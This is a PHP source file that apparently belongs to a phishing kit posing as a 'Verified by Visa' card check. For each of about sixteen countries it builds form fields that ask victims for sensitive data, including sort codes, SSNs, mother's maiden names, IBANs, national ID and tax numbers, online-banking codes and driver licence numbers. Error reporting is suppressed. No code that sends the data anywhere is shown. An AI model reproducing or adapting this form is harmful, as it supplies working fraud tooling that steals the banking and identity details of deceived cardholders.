<?php
error_reporting(0);
ini_set('display_errors', 0);
class VBV{
	public static function InputCard($Country){
		if($Country == "United Kingdom"){
			$Input ="
			<tr>
				<td align='right'>Sort Code : </td>
				<td><input required style='width: 75px;' type='text' id='sortcode' name='sort_code' placeholder='XX-XX-XX' maxlength='8' /></td>
			</tr>
			<tr>
				<td align='right'>Account Number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>Mother Maiden Name : </td>
				<td><input style='width: 150px' type='text' name='MOTHERMAIDNNAME' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "United States"){
			$Input ="
			<tr>
				<td align='right'>SNN : </td>
				<td>
					<input type='text' id='snn3' name='ssn3' style='width: 25px;' maxlength='3' /> - <input type='text' id='snn2' name='ssn2' style='width: 18px;' maxlength='2' /> - <input type='text' id='snn4' name='ssn4' style='width: 33px;' maxlength='4' />
				</td>
			</tr>
			<tr>
				<td align='right'>Mother Maidn Name : </td>
				<td><input style='width: 150px' type='text' name='MOTHERMAIDNNAME' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Canada"){
			$Input ="
            	<tr>
				<td align='right'>SNN : </td>
				<td>
					<input type='text' id='snn3' name='ssn3' style='width: 25px;' maxlength='3' /> - <input type='text' id='snn2' name='ssn2' style='width: 18px;' maxlength='2' /> - <input type='text' id='snn4' name='ssn4' style='width: 33px;' maxlength='4' />
				</td>
			</tr>
			<tr>
				<td align='right'>Mother Maidn Name : </td>
				<td><input style='width: 150px' type='text' name='MOTHERMAIDNNAME' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Germany"){
			$Input ="
			<tr>
				<td align='right'>Account Number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Austria"){
			$Input ="
			<tr>
				<td align='right'>IBAN : </td>
				<td><input style='width: 150px' type='text' name='IBAN' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Netherlands"){
			$Input ="
			<tr>
				<td align='right'>IBAN : </td>
				<td><input style='width: 150px' type='text' name='IBAN' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Ireland"){
			$Input ="
			<tr>
				<td align='right'>Mother Maidn Name : </td>
				<td><input style='width: 150px' type='text' name='MOTHERMAIDNNAME' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>Daily credit limits : </td>
				<td><input style='width: 150px' type='text' name='Dailycreditlimits' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "New Zealand"){
			$Input ="
			<tr>
				<td align='right'>Monthly credit limits : </td>
				<td><input style='width: 150px' type='text' name='Monthly_credit_limits' required='' '/></td>
			</tr>
            <tr>
				<td align='right'>Access number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Luxembourg"){
			$Input ="
			<tr>
				<td align='right'>Account Number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Spain"){
			$Input ="
			<tr>
				<td align='right'>Account Number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>National ID Number : </td>
				<td><input style='width: 150px' type='text' name='NationalIDNumbe' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>Code of your  BSOnline Individual : </td>
				<td><input style='width: 150px' type='text' name='BSOnline' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Albania"){
			$Input ="
			<tr>
				<td align='right'>Account Number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>full mother name : </td>
				<td><input style='width: 150px' type='text' name='fullmothername' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Cyprus"){
			$Input ="
			<tr>
				<td align='right'>Tax Number : </td>
				<td><input style='width: 150px' type='text' name='TaxNumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>Id number : </td>
				<td><input style='width: 150px' type='text' name='Idnumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>Last 4 digits of ID / Passport : </td>
				<td><input style='width: 150px' type='text' name='Passport' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Australia"){
			$Input ="
			<tr>
				<td align='right'>Driver license number : </td>
				<td><input style='width: 150px' type='text' name='Driverlicensenumber' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>State of issue : </td>
				<td><input style='width: 150px' type='text' name='Stateofissueofdriverlicense' required='' '/></td>
			</tr>
			<tr>
				<td align='right'>OCID : </td>
				<td><input style='width: 150px' type='text' name='OCID' required='' maxlength='12' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Switzerland"){
			$Input ="
			<tr>
				<td align='right'>Account number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Finland"){
			$Input ="
			<tr>
				<td align='right'>Account number : </td>
				<td><input style='width: 150px' type='text' name='accountnumber' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		if($Country == "Italy"){
			$Input ="
			<tr>
				<td align='right'>Codice fiscale : </td>
				<td><input style='width: 150px' type='text' name='Codicefiscale' required='' '/></td>
			</tr>
			";
			return $Input;
		}
		return false;
	}
}



?>